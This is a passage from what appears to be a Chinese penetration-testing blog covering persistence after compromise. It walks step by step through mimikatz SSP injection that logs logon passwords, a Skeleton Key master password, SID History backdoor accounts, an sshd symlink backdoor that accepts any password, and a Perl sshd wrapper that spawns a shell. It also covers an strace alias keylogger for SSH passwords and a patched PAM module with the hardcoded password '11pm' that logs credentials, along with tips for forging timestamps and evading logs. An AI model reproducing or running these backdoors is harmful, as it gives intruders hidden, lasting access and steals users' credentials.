mimilib.dll 添加到注册表中，使用此方法<br>即使系统重启，也不会影响到持久化的效果。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy mimilib.dll %systemroot%\system32</span><br><span class="line">reg query hklm\system\currentcontrolset\control\lsa\ /v </span><br><span class="line">&quot;Security Packages&quot;</span><br><span class="line">reg add &quot;hklm\system\currentcontrolset\control\lsa\&quot; /v </span><br><span class="line">&quot;Security Packages&quot; /d </span><br><span class="line">&quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; </span><br><span class="line">/t REG_MULTI_SZ</span><br></pre></td></tr></table></figure><blockquote><p>注意：在powershell中执行reg，在cmd中执行可能会报错</p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231351000.png" alt="image-20220823135143820"></p><p>计算机重启后，如果有用户成功登录到当前系统中,会在 c:\windows\system32  目<br>录下生成一个用于记录登账账号密码的 kiwissp.log  文件</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231352923.png" alt="image-20220823135211795"></p><ul><li>Memory Updating of SSPs</li></ul><blockquote><p>使用mimikatz将伪造的SSP注入内存，这样做不会在系统中留下二进制文件，<br>但如果域控制器重启，被注入内存的伪造的SSP将会丢失。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz privilege::debug</span><br><span class="line">mimikatz misc::memssp</span><br><span class="line">type C:\Windows\System32\mimilsa.log</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231352240.png" alt="image-20220823135253059"></p><h1 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a>Skeleton Key</h1><h2 id="Skeleton-Key简介"><a href="#Skeleton-Key简介" class="headerlink" title="Skeleton Key简介"></a>Skeleton Key简介</h2><p>Skeleton Key是一种不需要域控重启即能生效的维持域控权限方法。<br>Skeleton Key被安装在64位的域控服务器上,支持Windows Server2003—Windows<br>Server2012 R2,能够让所有域用户使用同一个万能密码进行登录，现有的所有域用户<br>使用原密码仍能继续登录，注意并不能更改用户权限，重启后失效。</p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><ul><li>在域控安装Skeleton Key</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231353330.png" alt="image-20220823135324209"></p><ul><li>域内主机使用Skeleton Key登录域控</li></ul><blockquote><p>mimikatz的默认Skeleton Key设置为mimikatz，Skeleton Key只是给所有账户<br>添加了一个万能密码，无法修改账户的权限</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\DC.de1ay.com mimikatz /user:administrator@de1ay.com</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231353168.png" alt="image-20220823135356040"></p><h1 id="SID-History"><a href="#SID-History" class="headerlink" title="SID History"></a>SID History</h1><h2 id="SID简介"><a href="#SID简介" class="headerlink" title="SID简介"></a>SID简介</h2><p>每个用户都有自己的SID。SID的作用主要是跟踪安全主体控制用户连接资源时的访问权限。<br>SID History是在域迁移过程中需要使用的一个属性。</p><p>如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影<br>响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。<br>SID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的<br>SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移<br>后的用户保持原有权限、能够访问其原来可以访问的资源。<br>使用mimikatz，可以将SID History属性添加到域中任意用户的SID History属性中。<br>在实战中，如果获得了域管理员权限，则可以将SID History作为实现持久化的方<br>法。</p><h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><ul><li>域控上添加并启用域账户</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dsadd user cn=ming,dc=de1ay,dc=com -disabled no -pwd ll@1qazWSX</span><br></pre></td></tr></table></figure><ul><li>Mimikatz添加后门</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add /sam:ming /new:administrator</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231354573.png" alt="image-20220823135449459"></p><ul><li>PowerShell查看ming用户的SID History</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">Get-ADUser ming -Properties sidhistory</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231355708.png" alt="image-20220823135515554"></p><ul><li>验证域用户ming是否有具有administrator权限：</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231355205.png" alt="image-20220823135531057"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限维持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x31 - Linux权限维持</title>
      <link href="/2022-08-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x31-Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>/2022-08-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x31-Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h1 id="SSH后门"><a href="#SSH后门" class="headerlink" title="SSH后门"></a>SSH后门</h1><blockquote><p>常见后门方式，隐蔽性也比较高，也很方便进入系统</p></blockquote><h2 id="软链接-sshd"><a href="#软链接-sshd" class="headerlink" title="软链接 sshd"></a>软链接 sshd</h2><blockquote><ul><li><p>类似Windows下面的快捷方式，可以通过访问对应软链接实现访问对应程序的效果，比如python和python3都链接指向python3.9</p></li><li><p>ln命令</p></li></ul><blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    --backup[=CONTROL]  为每个已存在的目标文件创建备份文件</span><br><span class="line">-b        类似--backup，但不接受任何参数</span><br><span class="line">-d, -F, --directory   创建指向目录的硬链接(只适用于超级用户)</span><br><span class="line">-f, --force     强行删除任何已存在的目标文件</span><br><span class="line">-i, --interactive           覆盖既有文件之前先询问用户；</span><br><span class="line">-L, --logical               取消引用作为符号链接的目标</span><br><span class="line">-n, --no-dereference        把符号链接的目的目录视为一般文件；</span><br><span class="line">-P, --physical              直接将硬链接到符号链接</span><br><span class="line">-r, --relative              创建相对于链接位置的符号链接</span><br><span class="line">-s, --symbolic              对源文件建立符号链接，而非硬链接；</span><br><span class="line">-S, --suffix=SUFFIX         用<span class="string">&quot;-b&quot;</span>参数备份目标文件后，备份文件的字尾会被加上一个备份字符串，预设的备份字符串是符号“~”，用户可通过“-S”参数来改变它；</span><br><span class="line">-t, --target-directory=DIRECTORY  指定要在其中创建链接的DIRECTORY</span><br><span class="line">-T, --no-target-directory   将“LINK_NAME”视为常规文件</span><br><span class="line">-v, --verbose               打印每个链接文件的名称</span><br><span class="line">    --<span class="built_in">help</span>    显示此帮助信息并退出</span><br><span class="line">    --version   显示版本信息并退出</span><br></pre></td></tr></table></figure></blockquote></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!bash</span></span><br><span class="line"><span class="comment">#将目录/usr/sbin下的文件sshd链接到目录/tmp下的文件su</span></span><br><span class="line"><span class="comment">#/tmp/su -oport=12345表示以sshd开启了一个12345的端口，表示在12345端口有个ssh服务。可以通过此端口以ssh连接主机</span></span><br><span class="line"><span class="built_in">ln</span> -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345</span><br><span class="line">ssh root@192.168.78.19 -p 12345</span><br><span class="line"></span><br><span class="line"><span class="comment">#检验端口启动</span></span><br><span class="line">netstat -anlp | grep 12345</span><br><span class="line"><span class="comment">#检查su进程</span></span><br><span class="line">ps -elf | grep su</span><br></pre></td></tr></table></figure><p>输入任意密码就可以root用户权限登陆，如果root用户被禁止登陆时，可以利用其他存在的用户身份登陆</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@ip -p 12345<span class="comment">#ssh以指定端口登录对面机器，输入任意密码即可登录</span></span><br></pre></td></tr></table></figure><blockquote><p>注：为什么产生这种现象，参考：<a href="https://www.cnblogs.com/likaiming/p/11007919.html">Linux的一个后门引发对PAM的探究</a></p></blockquote><h2 id="SSH-Server-Wrapper"><a href="#SSH-Server-Wrapper" class="headerlink" title="SSH Server Wrapper"></a>SSH Server Wrapper</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!bash</span></span><br><span class="line"><span class="built_in">cd</span> /usr/sbin</span><br><span class="line"><span class="built_in">mv</span> sshd ../bin</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/usr/bin/perl&#x27;</span> &gt;sshd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..LF/);&#x27;</span> </span><br><span class="line">&gt;&gt;sshd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27;</span> &gt;&gt;sshd</span><br><span class="line"><span class="built_in">chmod</span> u+x sshd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat STDIO TCP4:192.168.78.37:22,sourceport=19526</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212333280.png" alt="image-20220821233322129"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212333898.png" alt="image-20220821233342782"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#其中`x00x00LF`是19526的大端形式，便于传输和处理。如果你想修改源端口，</span></span><br><span class="line">可以用python的struct标准库实现</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> struct</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">19526</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">repr</span>(buffer)</span><br><span class="line"><span class="string">&#x27;\x00\x00LF&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">13377</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> buffer</span><br><span class="line">4A</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">16714</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> buffer</span><br><span class="line">AJ</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212334709.png" alt="image-20220821233416497"></p><ul><li>原理:</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则</span><br><span class="line">匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。</span><br><span class="line">原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。</span><br><span class="line">这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这</span><br><span class="line">样子控制权又回到脚本了。</span><br><span class="line">此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的</span><br><span class="line">TCP源端口，如果是19526就执行sh给个shell。</span><br><span class="line">来自https://www.anquanke.com/post/id/155943#h2-9</span><br></pre></td></tr></table></figure><h2 id="SSH-Key"><a href="#SSH-Key" class="headerlink" title="SSH Key"></a>SSH Key</h2><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成私钥和公钥：</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="comment">#会在当前用户目录的.ssh目录下面生成一对公私钥</span></span><br><span class="line"><span class="comment">#把公钥id_rsa.pub发送到目标上,并修改目标主机上的文件：</span></span><br><span class="line">vim /root/.ssh/authorized_keys</span><br><span class="line"><span class="comment">#连接用户</span></span><br><span class="line">ssh root@ip</span><br><span class="line"><span class="comment">#更改时间：</span></span><br><span class="line"><span class="built_in">touch</span> -r：&lt;参考文件或目录&gt;  <span class="comment">#把指定文件或目录的日期时间，统统设成和参考文件或目录的日期时间相同；</span></span><br><span class="line"><span class="comment">#如把authorized_keys的时间换成known_hosts的时间</span></span><br><span class="line"><span class="built_in">touch</span> -r known_hosts authorized_keys</span><br><span class="line"><span class="comment">#重启ssh服务：</span></span><br><span class="line">service ssh restart</span><br></pre></td></tr></table></figure><h3 id="关于known-hosts文件"><a href="#关于known-hosts文件" class="headerlink" title="关于known_hosts文件:"></a>关于<strong>known_hosts</strong>文件:</h3><blockquote><p>用户的.ssh目录下面有有个<strong>known_hosts</strong>文件，这个文件存储本机曾经ssh连接过的远程主机的公钥，用来在连接时和对面主机上的公钥进行比对，如果一样则进行下一步操作！</p><p>ssh会把你每个你访问过计算机的公钥(public key)都记录在known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。</p><p>参考：<a href="https://www.cnblogs.com/fonxian/p/11228760.html">https://www.cnblogs.com/fonxian/p/11228760.html</a></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208272057217.png" alt="image-20220827205707043" style="zoom:50%;" /></blockquote><h2 id="SSH-Keylogger键盘记录"><a href="#SSH-Keylogger键盘记录" class="headerlink" title="SSH Keylogger键盘记录"></a>SSH Keylogger键盘记录</h2><blockquote><p>了解即可，知道怎么用，alias后门的一种</p><p>我们可以通过记录键盘值获取许多信息，比如在主机中登陆了其他的东西，ssh就能获取</p></blockquote><p>编辑当前用户下的 .bashrc 文件，在配置文件末尾添加：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> ssh=<span class="string">&#x27;strace -o /tmp/sshpwd-`date +%d%h%m%s`.log -e read,write,connect -s2048 ssh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#strace 我们可以使用strace对应用的系统调用和信号传递的跟踪结果来对应用进行分析，以达到解决问题或者是了解应用工作过程的目的。</span></span><br><span class="line"><span class="comment">#在命令执行的过程中，strace会记录和解析命令进程的所有系统调用以及这个进程所接收到的所有的信号值。</span></span><br><span class="line"><span class="comment">#参数-o filename 将strace的输出写入文件filename</span></span><br><span class="line"><span class="comment">#参数-e read=set 输出从指定文件中读出 的数据.例如: -e read=3,5</span></span><br><span class="line"><span class="comment">#参数-e write=set 输出写入到指定文件中的数据.</span></span><br><span class="line"><span class="comment">#参数-s strsize 指定输出的字符串的最大长度.默认为32.文件名一直全部输出.</span></span><br><span class="line"><span class="comment">#末尾的ssh是以strace ssh启动到达ssh程序，使用strace了解程序输入输出，类似debug的过程~~所以我们会在不知不觉中生成记录键盘输入的文件log，并且无感的执行了ssh</span></span><br></pre></td></tr></table></figure><blockquote><p>解释：</p><p>alias讲ssh命令别名等于<code>strace -o /tmp/sshpwd-date +%d%h%m%s.log -e read,write,connect -s2048 ssh</code>,与执行ssh有相同的效果，但是其在不知不觉中执行了没有回显的命令，将在temp目录下生成一个log文件~~~</p><p>ssh连接输入密码时的密码无论错误或者正确都能记录到log里。</p><p>如果想更加隐蔽 可以把生成的log改去其他目录~~~</p><p>如下图中，read函数里面的内容就是我们每次按下的按键！~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212350723.png" alt="image-20220821235055521" style="zoom:50%;" /></blockquote><h2 id="SSH隐身登录"><a href="#SSH隐身登录" class="headerlink" title="SSH隐身登录"></a>SSH隐身登录</h2><blockquote><p>较好的方式，隐身登录系统，不会被last who w等指令检测到</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208291236826.png" alt="image-20220829123612629" style="zoom: 33%;" /></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T root@192.168.22.11 /bin/bash -i</span><br><span class="line">ssh -o UserKnownHostsFile=/dev/null -T root@192.168.22.11 /bin/bash -<span class="keyword">if</span></span><br></pre></td></tr></table></figure><blockquote><p>补充一些命令：</p><ul><li>who     查看当前登录用户（tty本地登陆  pts远程登录）</li><li>w       查看系统信息，想知道某一时刻用户的行为，可以看到当前时间有几个用户在线</li><li>last     最后登录时间的用户，，still logged in表示还在该用户依旧在线，tty本地登陆  pts远程登录</li><li>uptime  查看登陆多久、多少用户，负载</li><li>查询特权用户特权用户(uid 为0)</li></ul><blockquote><p>awk -F: ‘$3&#x3D;&#x3D;0{print $1}’ &#x2F;etc&#x2F;passwd</p></blockquote><ul><li>查询可以远程登录的帐号信息</li></ul><blockquote><p>awk ‘&#x2F;$1|$6&#x2F;{print $1}’ &#x2F;etc&#x2F;shadow</p></blockquote><ul><li>除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</li></ul><blockquote><p>more &#x2F;etc&#x2F;sudoers | grep -v “^#|^$” | grep “ALL&#x3D;(ALL)”</p></blockquote></blockquote><h1 id="Linux-PAM-后门"><a href="#Linux-PAM-后门" class="headerlink" title="Linux PAM 后门"></a>Linux PAM 后门</h1><blockquote><ul><li>难以发现 实用，源码级别的后门</li><li>PAM是Linux默认的ssh认证登录机制，因为他是开源的，我们可以修改源码实现自定义认证逻辑，达到记录密码、自定义密码登录、dns带外等功能。参考学习：<a href="https://www.cnblogs.com/kevingrace/p/8671964.html">Linux下PAM模块学习总结</a></li><li>概述：当我们获取目标主机权限后，可以尝试对pam组件源码进行修改，重新编译生成so文件，</li></ul></blockquote><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg -l | grep pam<span class="comment">#查看pam版本</span></span><br></pre></td></tr></table></figure><h3 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/centos-release<span class="comment">#查看操作系统版本</span></span><br><span class="line">CentOS Linux release 7.7.1908 (Core)</span><br><span class="line"></span><br><span class="line">rpm -qa|grep pam<span class="comment">#查看pam版本，后门下载对应版本的源码</span></span><br><span class="line">gnome-keyring-pam-3.28.2-1.el7.x86_64</span><br><span class="line">fprintd-pam-0.8.1-2.el7.x86_64</span><br><span class="line">pam-1.1.8-22.el7.x86_64</span><br></pre></td></tr></table></figure><p>centos需要关闭selinux，临时关闭<code>setenforce 0</code>。永久关闭需要修改<code>/etc/selinux/config</code>，将其中SELINUX设置为disabled。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sestatus命令</span></span><br><span class="line">SELinux status:                 disabled<span class="comment">#查询结果</span></span><br><span class="line"><span class="comment">#/etc/selinux/config命令</span></span><br><span class="line"><span class="comment">#结果：</span></span><br><span class="line"><span class="comment"># This file controls the state of SELinux on the system.</span></span><br><span class="line"><span class="comment"># SELINUX= can take one of these three values:</span></span><br><span class="line"><span class="comment">#     enforcing - SELinux security policy is enforced.</span></span><br><span class="line"><span class="comment">#     permissive - SELinux prints warnings instead of enforcing.</span></span><br><span class="line"><span class="comment">#     disabled - No SELinux policy is loaded.</span></span><br><span class="line">SELINUX=disabled</span><br><span class="line"><span class="comment"># SELINUXTYPE= can take one of three values:</span></span><br><span class="line"><span class="comment">#     targeted - Targeted processes are protected,</span></span><br><span class="line"><span class="comment">#     minimum - Modification of targeted policy. Only selected processes are protected.</span></span><br><span class="line"><span class="comment">#     mls - Multi Level Security protection.</span></span><br><span class="line">SELINUXTYPE=targeted</span><br></pre></td></tr></table></figure><h2 id="下载pam源码"><a href="#下载pam源码" class="headerlink" title="下载pam源码"></a>下载pam源码</h2><h3 id="快捷命令获取源码"><a href="#快捷命令获取源码" class="headerlink" title="快捷命令获取源码~"></a>快捷命令获取源码~</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get <span class="built_in">source</span> libpam-modules=`dpkg -s libpam-modules | grep -i version | <span class="built_in">cut</span> -d<span class="string">&#x27; &#x27;</span> -f2`</span><br><span class="line"></span><br><span class="line"><span class="comment">#apt-get source - 可以下载源码文件</span></span><br><span class="line"><span class="comment">#dpkg -s libpam-modules | grep -i version | cut -d&#x27; &#x27; -f2- 查询Ubuntu的pam版本</span></span><br></pre></td></tr></table></figure><h3 id="开源源码下载"><a href="#开源源码下载" class="headerlink" title="开源源码下载"></a>开源源码下载</h3><blockquote><p>查看PAM版本<code>rpm -qa|grep pam</code></p><p>下载对应源码:</p><blockquote><blockquote><p>Ubuntu建议在这里下载</p></blockquote><ul><li><a href="https://code.launchpad.net/~ubuntu-core-dev/ubuntu/+source/pam/+git/pam">https://code.launchpad.net/~ubuntu-core-dev/ubuntu/+source/pam/+git/pam</a></li></ul><blockquote><p>用GitHub上面的源码编译出来貌似有点问题，</p></blockquote><ul><li><a href="https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_8.tar.gz">https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_8.tar.gz</a></li><li><a href="https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.3.1.tar.gz">https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.3.1.tar.gz</a></li></ul></blockquote><p><strong>针对基于 Debian 的 Linux 发行版</strong>，是否有适配其他发行版请阅读<a href="https://github.com/linux-pam/linux-pam">readme文件</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.3.1.tar.gz</span><br><span class="line">tar -zxf v1.3.1.tar.gz</span><br></pre></td></tr></table></figure><h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><blockquote><p>编译的环境</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Ubuntu</span></span><br><span class="line">apt install -y gcc flex dpkg-dev</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#centos</span></span><br><span class="line"><span class="comment">#需要先换源，然后更新依赖关系~</span></span><br><span class="line">yum install -y epel-release</span><br><span class="line"><span class="comment">#安装gcc编译器和flex库</span></span><br><span class="line">yum install gcc flex flex-devel -y</span><br></pre></td></tr></table></figure><blockquote><ul><li>centos常用包管理命令参考：<a href="https://vence.github.io/2016/05/14/centos-packagemanager/">https://vence.github.io/2016/05/14/centos-packagemanager/</a></li><li>按照过程中遇到问题：yum install告知“没有可用软件包 xxx”</li></ul><blockquote><p>需要先换源，然后update，参考：<a href="https://blog.csdn.net/wsuyixing/article/details/125824442">https://blog.csdn.net/wsuyixing/article/details/125824442</a></p></blockquote></blockquote><h2 id="修改pam-unix-auth-c源码"><a href="#修改pam-unix-auth-c源码" class="headerlink" title="修改pam_unix_auth.c源码"></a>修改pam_unix_auth.c源码</h2><blockquote><p>linux-pam-Linux-PAM-1_1_8&#x2F;modules&#x2F;pam_unix&#x2F;pam_unix_auth.c</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> v1.3.1</span><br><span class="line">vim ./modules/pam_unix/pam_unix_auth.c</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//添加代码</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;11pm&quot;</span>,p)==<span class="number">0</span>) &#123;<span class="keyword">return</span> PAM_SUCCESS;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>11pm为设置的密码。如果输入的密码是11pm则直接返回成功，不会进行其他操作</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212352885.png" alt="image-20220821235238764" style="zoom:50%;" /><h2 id="编译生成so文件"><a href="#编译生成so文件" class="headerlink" title="编译生成so文件"></a>编译生成so文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> v1.3.1</span><br><span class="line"><span class="comment">#自动生成配置脚本，大部分时候好像是需要如此</span></span><br><span class="line">./autogen.sh</span><br><span class="line"><span class="comment">#开始编译</span></span><br><span class="line"><span class="comment">#配置（./configure --help | less查看配置）</span></span><br><span class="line">./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>编译后生成so文件的路径：Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;.lib&#x2F;pam_unix.so</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208212352178.png" alt="image-20220821235259019"></p><h2 id="替换系统pam-unix-so文件"><a href="#替换系统pam-unix-so文件" class="headerlink" title="替换系统pam_unix.so文件"></a>替换系统pam_unix.so文件</h2><ul><li>查找系统pam_unix.so文件路径</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name pam_unix.so 2&gt;/dev/null</span><br><span class="line"><span class="comment">#/lib/x86 64-linux-gnu/security/pam unix.so</span></span><br></pre></td></tr></table></figure><ul><li>备份系统pam_unix.so文件</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /lib/x86_64-linux-gnu/security/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so.bak</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"><span class="built_in">cp</span> /usr/lib/x86_64-linux-gnu/security/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so.bak</span><br></pre></td></tr></table></figure><ul><li>替换系统pam_unix.so文件</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /root/桌面/Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"><span class="built_in">cp</span> /root/temppp/11111/pam-1.3.1/modules/pam_unix/.libs/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so</span><br></pre></td></tr></table></figure><ul><li>查询是否执行成功</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> $?</span><br><span class="line"><span class="comment">#用来返回上一条执行的结果！</span></span><br><span class="line"><span class="comment">#成功则返回0</span></span><br><span class="line"><span class="comment">#不成功则不是0的一个整数</span></span><br></pre></td></tr></table></figure><h2 id="修改时间戳"><a href="#修改时间戳" class="headerlink" title="修改时间戳"></a>修改时间戳</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> pam_unix.so -r pam_xauth.so</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208311034561.png" alt="image-20220831103435233"></p><h2 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h2><p>复现成功~~~</p><p>密码为11pm，不影响原本root密码的登录。**使用了特定的密码绕过验证</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><blockquote><p>若不进行优化，则查看日志文件：&#x2F;var&#x2F;log&#x2F;auth.log，可以发现这种方式下的登录跟正常登录下的情况不一样。</p></blockquote><h4 id="正常日志："><a href="#正常日志：" class="headerlink" title="正常日志："></a>正常日志：</h4><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208311047601.png" alt="image-20220831104741410"></p><h4 id="非正常日志："><a href="#非正常日志：" class="headerlink" title="非正常日志："></a>非正常日志：</h4><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208311049953.png" alt="image-20220831104913751"></p><h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><blockquote><p>修改Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;pam_unix_auth.c</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* verify the password of this user */</span></span><br><span class="line">        retval = _unix_verify_password(pamh, name, p, ctrl);</span><br><span class="line"><span class="comment">//      if (strcmp(&quot;11pm&quot;,p)==0) &#123;return PAM_SUCCESS;&#125;</span></span><br><span class="line">        FILE * fp;</span><br><span class="line">        <span class="keyword">if</span> (retval == PAM_SUCCESS) &#123;</span><br><span class="line">          fp = fopen(<span class="string">&quot;/etc/pam.txt&quot;</span>,<span 